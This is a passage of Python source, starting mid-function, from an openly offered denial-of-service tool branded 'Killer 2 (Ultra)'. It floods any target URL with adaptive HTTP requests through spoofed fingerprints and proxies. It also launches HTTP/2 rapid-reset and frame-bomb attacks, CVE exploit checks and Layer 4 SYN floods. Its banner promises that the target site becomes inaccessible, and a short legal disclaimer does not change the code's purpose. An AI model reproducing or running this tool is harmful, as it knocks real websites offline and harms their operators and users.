                            worker_id=worker_id, file_size=file_size,
                            vector="fingerprint"
                        )
                        return
                except Exception:
                    pass  # fall back to normal

            for attempt in range(2):
                try:
                    async with self.session.request(
                        method=method,
                        url=url,
                        headers=headers,
                        proxy=proxy,
                        allow_redirects=False,
                    ) as resp:
                        elapsed = time.time() - start_time
                        data = b''
                        if method != 'HEAD':
                            data = await resp.content.read()
                        size = len(data)
                        self.stats["total"] += 1
                        self.stats["total_bytes"] += size

                        status = resp.status
                        if status in (200, 206, 416):
                            self.stats["success"] += 1
                        else:
                            self.stats["failed"] += 1

                        vector_name = vector.get('name', '')
                        self.printer.print_request(
                            req_id=req_id,
                            status=status,
                            method=method,
                            size=size,
                            path=path[:35],
                            elapsed=elapsed,
                            worker_id=worker_id,
                            file_size=file_size,
                            vector=vector_name
                        )
                        return
                except asyncio.TimeoutError:
                    if attempt == 0:
                        await asyncio.sleep(RETRY_DELAY)
                        continue
                    self.stats["total"] += 1
                    self.stats["timeout"] += 1
                    self.printer.print_request(
                        req_id=req_id,
                        status=408,
                        method=method,
                        size=0,
                        path=path[:35] + " ⏰",
                        elapsed=TIMEOUT,
                        worker_id=worker_id,
                        file_size=file_size,
                        vector=vector.get('name', '')
                    )
                    return
                except Exception as e:
                    if attempt == 0:
                        await asyncio.sleep(RETRY_DELAY)
                        continue
                    self.stats["total"] += 1
                    self.stats["errors"] += 1
                    self.printer.print_request(
                        req_id=req_id,
                        status=500,
                        method=method,
                        size=0,
                        path=path[:35] + " 💥",
                        elapsed=time.time() - start_time,
                        worker_id=worker_id,
                        file_size=file_size,
                        vector=vector.get('name', '')
                    )
                    return

    async def health_check(self) -> bool:
        print(Fore.YELLOW + "\n🔍 Performing health check...")
        healthy_codes = {}
        for path in TARGET_PATHS[:5]:
            try:
                async with self.session.get(f"{self.target}{path}") as resp:
                    healthy_codes[path] = resp.status
                    print(Fore.CYAN + f"  {path} → {resp.status}")
            except Exception as e:
                healthy_codes[path] = None
                print(Fore.RED + f"  {path} → ERROR: {str(e)[:50]}")
        self.base_status_codes = healthy_codes
        ok = all(c == 200 for c in healthy_codes.values() if c is not None)
        if ok:
            print(Fore.GREEN + "✅ Target seems healthy (baseline 200 OK).")
        else:
            print(Fore.YELLOW + f"⚠️ Baseline statuses: {healthy_codes} – proceeding anyway.")
        return True

    async def worker(self, worker_id: int, req_count: int):
        for i in range(req_count):
            if not self.attack_active:
                break
            self.request_counter += 1
            await self.send_request(self.request_counter, worker_id)

            if self.health_history and self.health_history[-1] != "OK":
                await asyncio.sleep(random.uniform(0.5, 1.5))
            else:
                await asyncio.sleep(random.uniform(0.05, 0.2))

            if i % 20 == 0:
                stats_for_print = self.stats.copy()
                stats_for_print['total'] = self.request_counter
                health = self.health_history[-1] if self.health_history else "UNKNOWN"
                self.printer.print_stats(
                    stats_for_print,
                    self.current_workers,
                    self.current_req_per_worker,
                    health=health
                )

    async def adjust_rate(self):
        while self.attack_active:
            await asyncio.sleep(5)

            if not hasattr(self, '_prev_total'):
                self._prev_total = 0
                self._prev_success = 0
            delta_total = self.stats['total'] - self._prev_total
            delta_success = self.stats['success'] - self._prev_success
            if delta_total > 0:
                error_rate = 1 - (delta_success / delta_total)
            else:
                error_rate = 0
            self._prev_total = self.stats['total']
            self._prev_success = self.stats['success']

            if error_rate < 0.2:
                health = "OK"
            elif error_rate < 0.5:
                health = "STRESSED"
            else:
                health = "DEGRADED"
            self.health_history.append(health)

            progress = min(1.0, (time.time() - self.stats['start_time']) / RAMP_UP_TIME)
            target_workers = int(INITIAL_WORKERS + (MAX_WORKERS - INITIAL_WORKERS) * progress)
            target_req_per_worker = int(REQUESTS_PER_WORKER_BASE +
                                        (REQUESTS_PER_WORKER_MAX - REQUESTS_PER_WORKER_BASE) * progress)

            if health == "DEGRADED":
                target_workers = max(INITIAL_WORKERS, int(target_workers * 0.5))
                target_req_per_worker = max(REQUESTS_PER_WORKER_BASE, int(target_req_per_worker * 0.7))
            elif health == "STRESSED":
                target_workers = int(target_workers * 0.8)
                target_req_per_worker = int(target_req_per_worker * 0.9)

            self.current_workers = target_workers
            self.current_req_per_worker = target_req_per_worker

    async def run_attack(self):
        print(Fore.RED + "="*80)
        print(Fore.RED + f"   💀 {self.label} – SMART BOOLDOZER ULTRA v2.0 💀")
        print(Fore.RED + "="*80)
        print(Fore.YELLOW + f"📡 Target: {self.target}")
        print(Fore.CYAN + "🔥 Adaptive, multi-vector, fingerprint spoofing, HTTP/2, CVE, Layer4\n")

        self.stats["start_time"] = time.time()
        await self.create_session()
        await self.health_check()

        # Ultra: initialize advanced modules
        if self.use_fingerprint:
            self.fingerprint_spoofer = FingerprintSpoofer(self.target, proxy=None)
        if self.use_http2:
            parsed = urlparse(self.target)
            host = parsed.hostname
            port = parsed.port or (443 if parsed.scheme == 'https' else 80)
            self.http2_attacker = HTTP2Attacker(host, port, use_tls=(parsed.scheme == 'https'))
        if self.use_cve:
            self.cve_exploiter = CVEExploiter(self.target, proxy=None)
        if self.use_layer4:
            parsed = urlparse(self.target)
            host = parsed.hostname
            port = parsed.port or 80
            self.layer4_attacker = Layer4Attacker(host, port, method="SYN", count=100)

        adjuster_task = asyncio.create_task(self.adjust_rate())

        # Ultra: fire HTTP/2 and CVE attacks in background
        if self.use_http2 and self.http2_attacker:
            asyncio.create_task(self._run_http2_attacks())
        if self.use_cve and self.cve_exploiter:
            asyncio.create_task(self._run_cve_checks())
        if self.use_layer4 and self.layer4_attacker:
            asyncio.create_task(self._run_layer4_attacks())

        print(Fore.CYAN + "⏱️ TIME  | ID     | METHOD | STATUS       | PATH                                | SIZE    | TIME  | WORKER | VECTOR")
        print(Fore.CYAN + "-" * 90)

        start_time = time.time()
        elapsed = 0
        total_workers = 0
        while elapsed < RAMP_UP_TIME and self.attack_active:
            new_workers = max(1, int(self.current_workers - total_workers))
            if new_workers > 0:
                for _ in range(min(new_workers, MAX_WORKERS - total_workers)):
                    total_workers += 1
                    task = asyncio.create_task(
                        self.worker(total_workers, self.current_req_per_worker)
                    )
                    self.active_tasks.add(task)
                    task.add_done_callback(self.active_tasks.discard)

            await asyncio.sleep(1)
            elapsed = time.time() - start_time

        print(Fore.YELLOW + f"\n⏳ Ramp-up complete. Waiting for {len(self.active_tasks)} workers to finish...")
        if self.active_tasks:
            await asyncio.gather(*self.active_tasks, return_exceptions=True)

        self.attack_active = False
        adjuster_task.cancel()

        self.stats["end_time"] = time.time()
        await self.session.close()

        elapsed_total = self.stats["end_time"] - self.stats["start_time"]
        self.printer.print_final_report(
            self.stats,
            total_workers,
            elapsed_total,
            self.health_history
        )

    async def _run_http2_attacks(self):
        """Execute HTTP/2 attack suite in background."""
        try:
            logger.info("Starting HTTP/2 attack suite...")
            self.http2_attacker.spoof_settings()
            self.http2_attacker.send_priority_frames()
            self.http2_attacker.send_grease_values()
            self.http2_attacker.rapid_reset_attack(num_streams=500)
            self.http2_attacker.made_you_reset_attack(num_streams=200)
            self.http2_attacker.http2_bomb(num_frames=2000)
            logger.info("HTTP/2 attack suite completed.")
        except Exception as e:
            logger.error(f"HTTP/2 attack error: {e}")

    async def _run_cve_checks(self):
        """Run CVE checks in background."""
        try:
            logger.info("Starting CVE checks...")
            results = self.cve_exploiter.run_all_checks()
            logger.info("CVE check results:")
            for cve, vulnerable in results.items():
                status = "VULNERABLE" if vulnerable else "safe/unknown"
                logger.info(f"  {cve}: {status}")
        except Exception as e:
            logger.error(f"CVE check error: {e}")

    async def _run_layer4_attacks(self):
        """Run Layer 4 attacks in background."""
        try:
            logger.info("Starting Layer 4 attacks...")
            self.layer4_attacker.attack()
            logger.info("Layer 4 attacks completed.")
        except Exception as e:
            logger.error(f"Layer 4 attack error: {e}")

# =============================================================================
# MAIN
# =============================================================================
async def main():
    banner = r"""
    ╔═══════════════════════════════════════════════════════════════════════════╗
    ║   💀  KILLER 2 (ULTRA)  –  SMART BOOLDOZER ULTRA v2.0                   ║
    ║   🔥  Multi-Vector Adaptive DoS Suite – Apache 2.2.11 & Beyond          ║
    ║                                                                           ║
    ║   Copyright (c) 2025 Avesta Hasanzadeh                                    ║
    ║   Telegram: @AvestaHacksDB                                                ║
    ║   Website: avesta-cyber-team.lovable.app                                  ║
    ║                                                                           ║
    ║   ⚠️  LEGAL WARNING:                                                       ║
    ║   This tool is intended solely for authorised security testing            ║
    ║   and vulnerability assessment on systems you own or have                 ║
    ║   explicit permission to test. Unauthorised use is illegal.               ║
    ║                                                                           ║
    ║   ⚡ EFFECT: As soon as the script runs, the target website               ║
    ║   will become inaccessible after a few moments. Stopping the              ║
    ║   script (Ctrl+C) will allow the server to recover.                       ║
    ║                                                                           ║
    ║   📌 TARGET: Must be Apache 2.2.11 (or similar vulnerable)                ║
    ║   The attack relies on the Range header vulnerability.                    ║
    ║   Additionally, HTTP/2, CVE exploits, and Layer 4 attacks are available.  ║
    ╚═══════════════════════════════════════════════════════════════════════════╝
    """
    print(Fore.RED + banner)
    global INITIAL_WORKERS, MAX_WORKERS, TIMEOUT
    parser = argparse.ArgumentParser(description="Killer 2 (Ultra) - Multi-Vector Adaptive DoS Suite")
    parser.add_argument("target", nargs="?", help="Target URL (e.g., http://example.com)")
    parser.add_argument("--mode", choices=["full", "layer7", "http2", "cve", "layer4", "all"], default="full",
                        help="Attack mode (default: full)")
    parser.add_argument("--workers", type=int, default=INITIAL_WORKERS, help="Initial workers")
    parser.add_argument("--max-workers", type=int, default=MAX_WORKERS, help="Maximum workers")
    parser.add_argument("--timeout", type=int, default=TIMEOUT, help="Request timeout")
    parser.add_argument("--proxy", help="SOCKS5/HTTP proxy (e.g., socks5://127.0.0.1:1080)")
    parser.add_argument("--no-fingerprint", action="store_true", help="Disable fingerprint spoofing")
    parser.add_argument("--no-http2", action="store_true", help="Disable HTTP/2 attacks")
    parser.add_argument("--no-cve", action="store_true", help="Disable CVE checks")
    parser.add_argument("--layer4", action="store_true", help="Enable Layer 4 attacks (requires scapy)")
    args = parser.parse_args()

    target = args.target
    if not target:
        target = input(Fore.YELLOW + "Enter target URL (e.g., http://example.com): ").strip()
        if not target:
            print(Fore.RED + "No target provided. Exiting.")
            return

    if not target.startswith(('http://', 'https://')):
        target = 'http://' + target

    attacker = SmartBouldozerUltra(target, "SMART🔥")
    # Apply command-line overrides
    INITIAL_WORKERS = args.workers
    MAX_WORKERS = args.max_workers
    TIMEOUT = args.timeout

    # Mode adjustments
    if args.mode in ["layer7", "full", "all"]:
        attacker.use_fingerprint = not args.no_fingerprint
        attacker.use_http2 = False
        attacker.use_cve = False
        attacker.use_layer4 = False
    if args.mode in ["http2", "all"]:
        attacker.use_http2 = not args.no_http2
    if args.mode in ["cve", "all"]:
        attacker.use_cve = not args.no_cve
    if args.mode in ["layer4", "all"] or args.layer4:
        attacker.use_layer4 = True

    try:
        await attacker.run_attack()
    except KeyboardInterrupt:
        print(Fore.RED + "\n\n[!] Attack interrupted by user.")
        attacker.attack_active = False
        for task in attacker.active_tasks:
            task.cancel()
        await asyncio.gather(*attacker.active_tasks, return_exceptions=True)
        if attacker.stats['start_time']:
            attacker.stats['end_time'] = time.time()
            elapsed = attacker.stats['end_time'] - attacker.stats['start_time']
            attacker.printer.print_final_report(
                attacker.stats,
                attacker.current_workers,
                elapsed,
                attacker.health_history
            )
    except Exception as e:
        print(Fore.RED + f"\n[!] Fatal error: {e}")

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print(Fore.RED + "\n[!] Goodbye!")
